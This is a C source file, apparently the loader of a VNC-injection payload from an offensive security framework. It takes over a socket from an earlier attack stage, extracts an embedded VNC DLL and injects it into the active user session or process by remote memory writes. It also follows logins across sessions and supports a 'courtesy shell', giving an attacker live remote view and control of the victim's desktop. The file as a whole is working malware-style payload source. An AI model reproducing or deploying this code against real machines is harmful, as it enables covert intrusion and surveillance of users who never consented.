// sf: March 2010.

#include "loader.h"
#include "context.h"
#include "ps.h"
#include "session.h"
#include "inject.h"

#define VNCFLAG_DISABLECOURTESYSHELL		1
#define VNCFLAG_DISABLESESSIONTRACKING		2

#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

/*
 * The HINSTANCE of this injected dll.
 */
extern HINSTANCE hAppInstance;

/*
 * The socket created by stage one.
 */
SOCKET sock                  = INVALID_SOCKET;

/*
 * Flag to disable following the active session as users log in an out of the input desktop.
 */
BOOL bDisableSessionTracking = FALSE;

/*
 * The event that signals the remote client has closed the socket connection.
 */
HANDLE hSocketCloseEvent     = NULL;

/*
 * The event to terminate the vnc agent.
 */
HANDLE hAgentCloseEvent      = NULL;

/*
 * The process hosting the vnc agent.
 */
HANDLE hAgentProcess         = NULL;

/*
 * The rfb streams context we keep for the agent (see context.c)
 */
extern AGENT_CTX AgentContext;

/*
 * Extract the vnc.dll into the provided DLL_BUFFER.
 */
DWORD loader_vncdll( DLL_BUFFER * pDllBuffer )
{
	DWORD dwResult           = ERROR_SUCCESS;
	HRSRC hVncResource       = NULL;
	HGLOBAL hVncResourceLoad = NULL;
	LPVOID lpVncDllBuffer    = NULL;
	DWORD dwVncDllSize       = 0;
#ifdef _WIN64
	DWORD dwCompiledArch     = PROCESS_ARCH_X64;
#else
	DWORD dwCompiledArch     = PROCESS_ARCH_X86;
#endif

	do
	{
		if( !pDllBuffer )
			BREAK_WITH_ERROR( "[LOADER] Init. pDllBuffer is null", ERROR_INVALID_PARAMETER );

		pDllBuffer->dwPE64DllLenght = 0;
		pDllBuffer->lpPE64DllBuffer = NULL;
		pDllBuffer->dwPE32DllLenght = 0;
		pDllBuffer->lpPE32DllBuffer = NULL;

		hVncResource = FindResource( (HMODULE)hAppInstance, "IDR_VNC_DLL", "IMG" );  
		if( !hVncResource )
			BREAK_ON_ERROR( "[LOADER] Init. FindResource failed" );
	
		dwVncDllSize = SizeofResource( (HMODULE)hAppInstance, hVncResource );
		if( !dwVncDllSize )
			BREAK_ON_ERROR( "[LOADER] Init. SizeofResource failed" );

		hVncResourceLoad = LoadResource( (HMODULE)hAppInstance, hVncResource );   
		if( !hVncResourceLoad )
			BREAK_ON_ERROR( "[LOADER] Init. LoadResource failed" );

		lpVncDllBuffer = LockResource( hVncResourceLoad );
		if( !lpVncDllBuffer )
			BREAK_ON_ERROR( "[LOADER] Init. LockResource failed" );

		dprintf( "[LOADER] Init. lpVncDllBuffer=0x%08X, dwVncDllSize=%d", lpVncDllBuffer, dwVncDllSize );

		if( dwCompiledArch == PROCESS_ARCH_X64 )
		{
			pDllBuffer->dwPE64DllLenght = dwVncDllSize;
			pDllBuffer->lpPE64DllBuffer = lpVncDllBuffer;
		}
		else if( dwCompiledArch == PROCESS_ARCH_X86 )
		{
			pDllBuffer->dwPE32DllLenght = dwVncDllSize;
			pDllBuffer->lpPE32DllBuffer = lpVncDllBuffer;
		}

	} while( 0 );

	SetLastError( dwResult );

	return dwResult;
}

/*
 * A pre injection hook called before our dll has been injected into a process.
 */
DWORD loader_inject_pre( DWORD dwPid, HANDLE hProcess, char * cpCommandLine )
{
	DWORD dwResult               = ERROR_SUCCESS;
	LPVOID lpMemory              = NULL;
	AGENT_CTX RemoteAgentContext = {0};
	int i                        = 0;

	do
	{
		if( !hProcess || !cpCommandLine )
			BREAK_WITH_ERROR( "[LOADER] loader_inject_pre. !hProcess || !cpCommandLine", ERROR_INVALID_PARAMETER );

		// Use User32!WaitForInputIdle to slow things down so if it's a new
		// process (like a new winlogon.exe) it can have a chance to initilize...
		// Bad things happen if we inject into an uninitilized process.
		WaitForInputIdle( hProcess, 10000 );

		CLOSE_HANDLE( hAgentCloseEvent );
		CLOSE_HANDLE( hAgentProcess );

		memcpy( &RemoteAgentContext, &AgentContext, sizeof(AGENT_CTX) );

		hAgentCloseEvent = CreateMutex( NULL, TRUE, NULL );
		if( !hAgentCloseEvent )
			BREAK_ON_ERROR( "[LOADER] loader_inject_pre. CreateEvent hAgentCloseEvent failed" );

		if( !DuplicateHandle( GetCurrentProcess(), hAgentCloseEvent, hProcess, &RemoteAgentContext.hCloseEvent, 0, FALSE, DUPLICATE_SAME_ACCESS ) )
			BREAK_ON_ERROR( "[LOADER] loader_inject_pre. DuplicateHandle hAgentCloseEvent failed" )
		
		dprintf( "[LOADER] WSADuplicateSocket for sock=%d", sock );

		// Duplicate the socket for the target process
		if( WSADuplicateSocket( sock, dwPid, &RemoteAgentContext.info ) != NO_ERROR )
			BREAK_ON_WSAERROR( "[LOADER] WSADuplicateSocket failed" )
	
		// Allocate memory for the migrate stub, context and payload
		lpMemory = VirtualAllocEx( hProcess, NULL, sizeof(AGENT_CTX), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
		if( !lpMemory )
			BREAK_ON_ERROR( "[LOADER] VirtualAllocEx failed" )
		
		/*for( i=0 ; i<4 ; i++ )
		{
			DWORD dwSize = 0;

			if( !AgentContext.dictionaries[i] )
				continue;
			
			dwSize = ( sizeof(DICTMSG) + AgentContext.dictionaries[i]->dwDictLength );

			RemoteAgentContext.dictionaries[i] = VirtualAllocEx( hProcess, NULL, dwSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
			if( !RemoteAgentContext.dictionaries[i] )
				continue;

			if( !WriteProcessMemory( hProcess, RemoteAgentContext.dictionaries[i], AgentContext.dictionaries[i], dwSize, NULL ) )
				RemoteAgentContext.dictionaries[i] = NULL;
		}*/

		// Write the ctx to memory...
		if( !WriteProcessMemory( hProcess, lpMemory, &RemoteAgentContext, sizeof(AGENT_CTX), NULL ) )
			BREAK_ON_ERROR( "[MIGRATE] WriteProcessMemory 1 failed" )

		hAgentProcess = hProcess;

		_snprintf_s( cpCommandLine, COMMANDLINE_LENGTH, COMMANDLINE_LENGTH - 1, "/v /c:0x%08p", lpMemory );

	} while( 0 );

	if( dwResult != ERROR_SUCCESS )
	{
		dprintf( "[LOADER] loader_inject_pre. CLOSE_HANDLE( hAgentCloseEvent );" );
		CLOSE_HANDLE( hAgentCloseEvent );
	}

	return dwResult;
}

/*
 * Close the various global handles we created for the agent..
 */
VOID loader_agent_close( VOID )
{
	CLOSE_HANDLE( hAgentCloseEvent );
	CLOSE_HANDLE( hAgentProcess );
}

/*
 * A post injection hook called after our dll has been injected into a process.
 */
DWORD loader_inject_post( DWORD dwPid, HANDLE hProcess, DWORD dwInjectResult )
{
	do
	{
		// if we have successfully injected, run the io thread and return
		if( dwInjectResult == ERROR_SUCCESS )
		{
			// we only want the agent to do the RFB initilization once (for the remote viewer)
			if( AgentContext.bInit )
				AgentContext.bInit = FALSE;
			break;
		}

		// but if injection failed close the process handle
		CLOSE_HANDLE( hProcess );

		loader_agent_close();

	} while( 0 );

	return dwInjectResult;
}

/*
 * Entry Point.
 */
DWORD Init( SOCKET s )
{
	DWORD dwResult              = ERROR_SUCCESS;
	BOOL bTerminate             = FALSE;
	HANDLE hMessageThread       = NULL;
	DLL_BUFFER VncDllBuffer     = {0};  
	char cCommandLine[MAX_PATH] = {0};
	DWORD dwHostSessionId       = 0;
	DWORD dwActiveSessionId     = 0;
	DWORD dwAgentSessionId      = 0xFFFFFFFF;
	BYTE bFlags                 = 0;

	__try
	{
		do
		{
			// We maintain state for the rfb stream so as not to desynchronize the remote
			// client after session switching and the injection of multiple agents server side.
			context_init();

			sock = s;
			if( sock == INVALID_SOCKET )
				BREAK_WITH_ERROR( "[LOADER] Init. INVALID_SOCKET", ERROR_INVALID_PARAMETER );
			
			if( recv( sock, (char *)&bFlags, 1, 0 ) == SOCKET_ERROR )
				BREAK_ON_WSAERROR( "[LOADER] Init. recv bFlags failed" );

			if( bFlags & VNCFLAG_DISABLECOURTESYSHELL )
				AgentContext.bDisableCourtesyShell = TRUE;

			if( bFlags & VNCFLAG_DISABLESESSIONTRACKING )
				bDisableSessionTracking = TRUE;

			dprintf( "[LOADER] Init. Starting, hAppInstance=0x%08X, sock=%d, bFlags=%d", hAppInstance, sock, bFlags );

			// get the vnc dll we will inject into the active session
			if( loader_vncdll( &VncDllBuffer ) != ERROR_SUCCESS )
				BREAK_ON_ERROR( "[LOADER] Init. loader_vncdll failed" );

			// create a socket event and have it signaled on FD_CLOSE
			hSocketCloseEvent = WSACreateEvent();
			if( hSocketCloseEvent == WSA_INVALID_EVENT )
				BREAK_ON_WSAERROR( "[LOADER] Init. WSACreateEvent failed" );

			if( WSAEventSelect( sock, hSocketCloseEvent, FD_CLOSE ) == SOCKET_ERROR )
				BREAK_ON_WSAERROR( "[LOADER] Init. WSAEventSelect failed" );

			// get the session id that our host process belongs to
			dwHostSessionId = session_id( GetCurrentProcessId() );

			hMessageThread = CreateThread( NULL, 0, context_message_thread, NULL, 0, NULL );
			if( !hMessageThread )
				BREAK_ON_ERROR( "[LOADER] Init. CreateThread context_message_thread failed" );

			// loop untill the remote client closes the connection, creating a vnc
			// server agent inside the active session upon the active session changing
			while( !bTerminate )
			{
				// in case we have been waiting for a session to attach to the physical  
				// console and the remote client has quit, we detect this here...
				if( WaitForSingleObject( hSocketCloseEvent, 0 ) == WAIT_OBJECT_0 )
				{
					dprintf( "[LOADER] Init. Remote socket closed, terminating1..." );
					break;
				}

				// get the session id for the interactive session
				dwActiveSessionId = session_activeid();
			
				// test if there is no session currently attached to the physical console...
				if( dwActiveSessionId == 0xFFFFFFFF )
				{
					dprintf( "[LOADER] Init. no session currently attached to the physical console..." );
					// just try to wait it out...
					Sleep( 250 );
					continue;
				}
				else if( dwActiveSessionId == dwAgentSessionId )
				{
					dprintf( "[LOADER] Init. dwActiveSessionId == dwAgentSessionId..." );
					// just try to wait it out...
					Sleep( 250 );
					continue;
				}

				// do the local process or session injection
				if( dwHostSessionId != dwActiveSessionId )
				{
					dprintf( "[LOADER] Init. Injecting into active session %d...", dwActiveSessionId );
					if( session_inject( dwActiveSessionId, &VncDllBuffer ) != ERROR_SUCCESS )
						BREAK_WITH_ERROR( "[LOADER] Init. session_inject failed", ERROR_ACCESS_DENIED );
				}
				else
				{
					dprintf( "[LOADER] Init. Allready in the active session %d.", dwActiveSessionId );
					if( ps_inject( GetCurrentProcessId(), &VncDllBuffer ) != ERROR_SUCCESS  )
						BREAK_WITH_ERROR( "[LOADER] Init. ps_inject current process failed", ERROR_ACCESS_DENIED );
				}
				
				dwAgentSessionId = dwActiveSessionId;

				// loop, waiting for either the agents process to die, the remote socket to die or
				// the active session to change...
				while( TRUE )
				{
					HANDLE hEvents[2]  = {0};
					DWORD dwWaitResult = 0;

					// wait for these event to be signaled or a timeout to occur...
					hEvents[0]   = hSocketCloseEvent;
					hEvents[1]   = hAgentProcess;
					dwWaitResult = WaitForMultipleObjects( 2, (HANDLE *)&hEvents, FALSE, 250 );
					
					// bail if we have somehow failed (e.g. invalid handle)
					if( dwWaitResult == WAIT_FAILED )
					{
						dprintf( "[LOADER] Init. WaitForMultipleObjects failed." );
						// if we cant synchronize we bail out...
						bTerminate = TRUE;
						break;
					}
					// if we have just timedout, test the current active session...
					else if( dwWaitResult == WAIT_TIMEOUT )
					{
						// if the agent is still in the active session just continue...
						if( dwAgentSessionId == session_activeid() )
							continue;
						// if we are not to perform session tracking try and stay in the current session (as it might become the active input session at a later stage)
						if( bDisableSessionTracking )
						{
							dprintf( "[LOADER] Init. Active session has changed, trying to stay in current session as session tracking disabled..." );
							Sleep( 500 );
							continue;
						}
						// if the agent is no longer in the active session we signal the agent to terminate
						if( !ReleaseMutex( hAgentCloseEvent ) )
							dprintf( "[LOADER] Init. ReleaseMutex 1 hAgentCloseEvent failed. error=%d", GetLastError() );							
						dprintf( "[LOADER] Init. Active session has changed. Moving agent into new session..." );
						dwAgentSessionId = 0xFFFFFFFF;
						// and we go inject a new agent into the new active session (or terminate if session tracking disabled)
						loader_agent_close();
						break;
					}
					// sanity check the result for an abandoned mutex
					else if( (dwWaitResult >= WAIT_ABANDONED_0) && (dwWaitResult <= (WAIT_ABANDONED_0 + 1)) )
					{
						dprintf( "[LOADER] Init. WAIT_ABANDONED_0 for %d", dwWaitResult - WAIT_ABANDONED_0 );
						bTerminate = TRUE;
						break;
					}
					else
					{
						// otherwise if we have an event signaled, handle it
						switch( dwWaitResult - WAIT_OBJECT_0 )
						{
							case 0:
								dprintf( "[LOADER] Init. Remote socket closed, terminating2..." );
								bTerminate = TRUE;
								if( !ReleaseMutex( hAgentCloseEvent ) )
									dprintf( "[LOADER] Init. ReleaseMutex 2 hAgentCloseEvent failed. error=%d", GetLastError() );
								ReleaseMutex( hAgentCloseEvent );
								break;
							case 1:
								dprintf( "[LOADER] Init. Injected agent's process has terminated..." );
								loader_agent_close();
								dwAgentSessionId = 0xFFFFFFFF;
								break;
							default:
								dprintf( "[LOADER] Init. WaitForMultipleObjects returned dwWaitResult=0x%08X", dwWaitResult );
								bTerminate = TRUE;
								if( !ReleaseMutex( hAgentCloseEvent ) )
									dprintf( "[LOADER] Init. ReleaseMutex 3 hAgentCloseEvent failed. error=%d", GetLastError() );
								break;
						}
					}

					// get out of this loop...
					break;
				}

			}

		} while( 0 );
	
		CLOSE_HANDLE( hSocketCloseEvent );

		loader_agent_close();

		closesocket( sock );

		if( hMessageThread )
			TerminateThread( hMessageThread, 0 );
	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		dprintf( "[LOADER] Init. EXCEPTION_EXECUTE_HANDLER\n\n" );
	}

	dprintf( "[LOADER] Init. Finished." );

	return dwResult;
}
